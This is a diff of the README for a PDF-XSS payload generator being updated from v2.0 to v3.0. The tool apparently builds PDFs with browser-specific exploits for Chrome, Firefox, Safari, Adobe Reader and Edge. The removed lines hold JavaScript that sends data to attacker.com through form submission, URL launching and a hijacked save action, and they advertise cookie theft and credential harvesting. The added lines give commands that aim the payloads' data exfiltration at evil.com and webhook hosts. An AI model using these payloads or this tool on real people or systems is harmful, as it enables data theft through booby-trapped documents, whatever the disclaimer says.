@@ -1,20 +1,24 @@
-# PDF-XSS Tool v2.0 - Advanced PDF Sandbox Escape Payloads
+# PDF-XSS Tool v3.0 - Optimized Browser-Specific PDF Payload Generator
 
 ## 🚀 PDF Browser Exploitation Framework
 
-A research-grade tool for generating PDF files with sophisticated payloads designed to escape PDF sandbox restrictions and achieve DOM access, file system access, and command execution across different browser PDF renderers.
+A streamlined tool for generating PDF files with browser-specific XSS payloads designed to escape PDF sandbox restrictions. Now optimized with browser-specific JSON databases and simplified interface.
 
 ## 📁 Project Structure
 
 ```
 PDF-XSS/
-├── script.py                     # Main PDF generator script
-├── Another-Script.py             # Alternative browser-specific PDF generator  
-├── pdf_payloads.json            # Consolidated PDF payload database
-├── IMPROVEMENTS.md              # Feature improvements documentation
-├── merge_json_payloads.py       # JSON payload database merger utility
-├── requirements.txt             # Python dependencies
-└── README.md                    # This file
+├── script.py                     # Main optimized PDF generator (v3.0)
+├── chrome.json                   # Chrome/PDFium specific payloads (15 payloads)
+├── firefox.json                  # Firefox/PDF.js specific payloads (15 payloads)
+├── safari.json                   # Safari/PDFKit specific payloads (12 payloads)
+├── adobe.json                    # Adobe Reader specific payloads (15 payloads)
+├── edge.json                     # Microsoft Edge specific payloads (12 payloads)
+├── payload_database_backup.json  # Backup of previous payload database
+├── requirements.txt              # Python dependencies (none required)
+├── IMPROVEMENTS.md               # Feature improvements documentation
+├── Files/                        # Generated PDF output directory
+└── README.md                     # This file
 ```
 
 ## ⚠️ Legal Disclaimer
@@ -23,39 +27,39 @@ This tool is designed for legitimate security testing, educational purposes, and
 
 ## 🎯 PDF Browser Targeting
 
-### Browser-Specific PDF Libraries
-- **Chrome (PDFium)**: 200+ targeted exploits for V8 engine exploitation, IPC abuse, process injection
-- **Firefox (PDF.js)**: 200+ CSP bypass techniques, SpiderMonkey exploitation, Content Security Policy evasion
-- **Safari (PDFKit)**: 200+ macOS-specific exploits, WebKit messageHandlers, Objective-C bridge abuse
-- **Adobe Reader**: 250+ full JavaScript API exploitation, privilege escalation, file system access
-- **Edge PDF**: 150+ Windows integration exploits, WebView exploitation, registry manipulation
+### Browser-Specific JSON Databases
+- **chrome.json**: Chrome/PDFium specific exploits (15 payloads) - DOM access, file system, command execution, sandbox escape
+- **firefox.json**: Firefox/PDF.js specific exploits (15 payloads) - CSP bypass, DOM manipulation, file system access
+- **safari.json**: Safari/PDFKit specific exploits (12 payloads) - WebKit integration, macOS-specific features
+- **adobe.json**: Adobe Reader/Acrobat specific exploits (15 payloads) - Full JavaScript API exploitation
+- **edge.json**: Microsoft Edge specific exploits (12 payloads) - Windows integration, WebView exploitation
 
-### PDF Sandbox Escape Categories
-- **DOM Access**: Browser DOM manipulation from PDF context
-- **File System**: Local file system access and directory traversal
-- **Command Execution**: System command execution and process spawning
-- **Sandbox Escape**: PDF sandbox restriction bypasses
-- **Network Exfiltration**: Data exfiltration and covert channels
+### Payload Categories
+- **dom_access**: Browser DOM manipulation from PDF context
+- **file_system**: Local file system access and directory traversal
+- **command_execution**: System command execution and process spawning
+- **sandbox_escape**: PDF sandbox restriction bypasses
+- **network_exfiltration**: Data exfiltration and covert channels
+- **csp_bypass**: Content Security Policy evasion techniques
+- **webkit_specific**: Safari WebKit specific exploits
+- **windows_integration**: Windows OS integration exploits
 
 ## 🛠️ Installation & Requirements
 
 ### Requirements
 - Python 3.x
-- No additional dependencies for basic functionality
+- No additional dependencies required
 
 ### Installation
 ```bash
-# Clone and navigate to PDF-XSS tool
+# Navigate to PDF-XSS directory
 cd PDF-XSS
 
-# Generate basic PDF files
-python3 script.py -o pdf
+# List available browsers and payload counts
+python3 script.py --list-browsers
 
-# Generate specific XSS payload type
-python3 script.py -t alert
-
-# Generate all XSS payload types
-python3 script.py -t all
+# Generate Chrome PDF files
+python3 script.py -b chrome -u http://test.com
 ```
 
 ## 📖 Usage
@@ -66,126 +70,122 @@ python3 script.py -t all
 # Show help and available options
 python3 script.py --help
 
-# List all available XSS payload types
-python3 script.py --list-types
+# List available browsers and payload counts
+python3 script.py --list-browsers
 
-# Generate basic PDF files
-python3 script.py -o pdf
+# Generate Chrome PDF files with custom URL
+python3 script.py -b chrome -u http://test.com
 
-# Generate specific XSS payload type
-python3 script.py -t alert
+# Generate Firefox PDF files (limited to 5)
+python3 script.py -b firefox --count 5
 
-# Generate all XSS payload types
-python3 script.py -t all
-
-# Generate HTML XSS test file
-python3 script.py -o html
-```
-
-### Advanced PDF Sandbox Escape Usage
-
-```bash
-# PDF data exfiltration via form submission escape
-python3 script.py -t cookie -u http://attacker.com/collect
-
-# PDF action-based sandbox escape
-python3 script.py -t action -u http://collaborator.burpsuite.com
-
-# PDF dialog manipulation for credential harvesting
-python3 script.py -t dialog -u http://logger.example.com
-
-# PDF file system escape attempts
-python3 script.py -t file
-
-# Generate all PDF sandbox escape types
-python3 script.py -t all -u http://collaborator.burpsuite.com
-
-# PDF network escape via URL launching
-python3 script.py -t network -u https://webhook.site/unique-id
+# Generate all browsers
+python3 script.py -b all -u http://webhook.site/xyz
 ```
 
 ### Browser-Specific PDF Generation
 
 ```bash
-# Generate Chrome-specific payloads
-python3 script.py -b chrome -u http://attacker.com/collect
+# Generate individual Chrome PDF files (one payload per file)
+python3 script.py -b chrome -u http://test.com
 
-# Generate all browser payloads with data exfiltration
-python3 script.py -b all -u https://webhook.site/xyz
+# Generate single file with all Firefox payloads (one payload per page)
+python3 script.py -b firefox --single-file -u http://evil.com
 
-# Target specific payload category
-python3 script.py -b firefox --category file_system -u http://evil.com
+# Generate Safari PDF files with custom PDF version
+python3 script.py -b safari --pdf-version 1.3 -u http://test.com
 
-# Create single file with ALL payloads for Chrome browser
-python3 script.py -b chrome --browser-specific-file -u http://test.com
+# Generate Adobe Reader PDF files
+python3 script.py -b adobe -u http://webhook.site/xyz
 
-# Create single file with ALL Firefox payloads
-python3 script.py -b firefox --browser-specific-file
+# Generate Microsoft Edge PDF files
+python3 script.py -b edge -u http://collaborator.com
+```
 
-# Use the alternative script for browser-specific PDFs
-python3 Another-Script.py -b chrome -u http://test.com
+### Advanced Options
 
-# Alternative script: Create single file with all Chrome payloads
-python3 Another-Script.py -b chrome --browser-specific-file -u http://test.com
+```bash
+# Limit number of payloads
+python3 script.py -b chrome --count 3 -u http://test.com
+
+# Use older PDF version (weaker security)
+python3 script.py -b firefox --pdf-version 1.3 -u http://test.com
+
+# Custom output directory
+python3 script.py -b safari -o CustomOutput -u http://test.com
+
+# Single file mode (one payload per page)
+python3 script.py -b adobe --single-file -u http://test.com
 ```
 
 ## 🏁 Command Line Flags
 
-| Flag | Long Form | Description | Example |
-|------|-----------|-------------|---------|
-| `-h` | `--help` | Show help message | `python3 script.py --help` |
-| `-u` | `--url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
-| `-o` | `--output` | Output format (pdf/html) | `-o pdf` |
-| `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
-| `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
-| `-b` | `--browser` | Target browser (chrome/firefox/safari/edge/adobe/all) | `-b chrome` |
-| | `--browser-specific-file` | Create single file with ALL payloads for specified browser | `--browser-specific-file` |
-| | `--list-types` | List available payload types | `--list-types` |
+| Flag | Description | Example |
+|------|-------------|---------|
+| `-h, --help` | Show help message | `python3 script.py --help` |
+| `-b, --browser` | Target browser (required) | `-b chrome` |
+| `-u, --url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
+| `-o, --output-dir` | Output directory | `-o Files` |
+| `--single-file` | One payload per page mode | `--single-file` |
+| `--count` | Limit number of payloads | `--count 5` |
+| `--pdf-version` | PDF version (1.0-2.0) | `--pdf-version 1.3` |
+| `--list-browsers` | List available browsers | `--list-browsers` |
 
 ## 📁 Output Files
 
-**All generated PDF files are automatically stored in a `Files/` directory.**
+**All generated PDF files are automatically stored in the `Files/` directory.**
 
-The tool creates the `Files` directory automatically if it doesn't exist. Generated PDF files follow the naming convention: `xss_<type>_<timestamp>.pdf`
+The tool creates two types of output:
 
-Examples:
-- `Files/xss_alert_20240115_143022.pdf`
-- `Files/xss_cookie_20240115_143025.pdf`
-- `Files/xss_custom_20240115_143030.pdf`
+### Individual Files Mode (Default)
+- One PDF file per payload
+- Naming: `{browser}_{technique}_{timestamp}.pdf`
+- Example: `chrome_parent_window_access_20240115_143022.pdf`
 
-## 🎯 PDF Sandbox Escape Examples
+### Single File Mode (`--single-file`)
+- Multiple PDF files, one payload per page
+- Naming: `{browser}_payload_{number}_{timestamp}.pdf`
+- Example: `firefox_payload_001_20240115_143025.pdf`
 
-### PDF Form Submission Escape
-```javascript
-// PDF-specific data exfiltration
-this.submitForm({
-    cURL: "http://attacker.com/collect",
-    cSubmitAs: "HTML",
-    cCharset: "utf-8"
-});
+## 🎯 Key Features
+
+### ✅ Optimizations in v3.0
+- **Browser-specific JSON databases**: Organized payloads by browser in separate JSON files
+- **Simplified command-line interface**: Reduced from 15+ flags to 7 essential flags
+- **One payload per page option**: `--single-file` creates separate PDF for each payload
+- **Complete payload visibility**: Full JavaScript payload shown in each PDF file
+- **OS-aware targeting**: Automatically adapts file paths based on operating system
+- **No browser validation removal**: Browser-specific files work without browser flag restrictions
+
+### 🗑️ Removed Complexity
+- **Merged and removed scripts**: Combined Another-Script.py and merge_json_payloads.py functionality
+- **Simplified payload obfuscation**: Removed complex obfuscation options
+- **Removed parallel processing**: Simplified execution model
+- **Reduced verbose output**: Cleaner, more focused output
+
+## 🔍 PDF Security Testing Examples
+
+### Generate Test Files for Different Browsers
+```bash
+# Chrome PDF viewer testing
+python3 script.py -b chrome -u http://collaborator.burp.com
+
+# Firefox PDF.js testing  
+python3 script.py -b firefox --single-file -u http://webhook.site/xyz
+
+# Adobe Reader API testing
+python3 script.py -b adobe -u http://requestbin.com/abc123
+
+# Safari WebKit testing
+python3 script.py -b safari --pdf-version 1.4 -u http://test.com
 ```
 
-### PDF URL Launching Escape
-```javascript
-// Escape sandbox via URL launching
-app.launchURL("http://attacker.com/escape?data=" + encodeURIComponent(data), true);
-```
-
-### PDF Action Hijacking
-```javascript
-// Hijack document actions for persistent escape
-this.setAction("WillSave", 
-    "app.launchURL('http://attacker.com/save-intercept', true);"
-);
-```
-
-## 🔍 PDF Security Testing Methodology
-
-1. **Generate PDF Test Files**: Use the tool to create PDF files with various sandbox escape payloads
-2. **Upload/Embed Testing**: Test file upload functionality on target applications
-3. **PDF Viewer Analysis**: Test different PDF viewers (Adobe Reader, browser built-ins, etc.)
-4. **Sandbox Escape Monitoring**: Monitor for successful escapes via URL launching, form submission
-5. **Data Exfiltration Testing**: Use URL flag to test actual data extraction capabilities
+### Payload Categories Testing
+Each browser JSON file contains categorized payloads:
+- **DOM Access**: Test DOM manipulation capabilities
+- **File System**: Test local file access restrictions
+- **Command Execution**: Test system command execution
+- **Network Exfiltration**: Test data exfiltration capabilities
 
 ## 🛡️ PDF-Specific Defensive Measures
 
@@ -199,15 +199,20 @@ To protect against PDF sandbox escape attacks:
 
 ## 📈 Changelog
 
-### Version 2.0 (Current) - PDF Sandbox Escape Enhancement
+### Version 3.0 (Current) - Optimization and Simplification
+- **✅ Browser-specific JSON databases**: Separate JSON files for each browser (chrome.json, firefox.json, etc.)
+- **✅ Simplified script interface**: Single script.py with streamlined flags
+- **✅ One payload per page option**: `--single-file` flag creates individual PDFs for each payload
+- **✅ Complete payload visibility**: Full JavaScript payloads visible in PDF files with filename headers
+- **✅ Removed complexity**: Eliminated Another-Script.py and merge_json_payloads.py
+- **✅ OS-aware targeting**: Automatic adaptation of file paths based on operating system
+- **✅ Improved documentation**: Updated README with clear examples and usage patterns
+
+### Version 2.0 - PDF Sandbox Escape Enhancement
 - **Complete rewrite for PDF sandbox context**
 - **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
 - **20+ sophisticated sandbox escape techniques**
 - **Enhanced PDF structure**: More complex PDF objects for better escape potential
-- **Action-based persistence**: PDF action hijacking for persistent attacks
-- **Dialog exploitation**: Credential harvesting via PDF dialogs
-- **Form submission escapes**: Data exfiltration via PDF form submission
-- **URL launching escapes**: Sandbox escape via app.launchURL()
 
 ## 🚨 Security Considerations
 
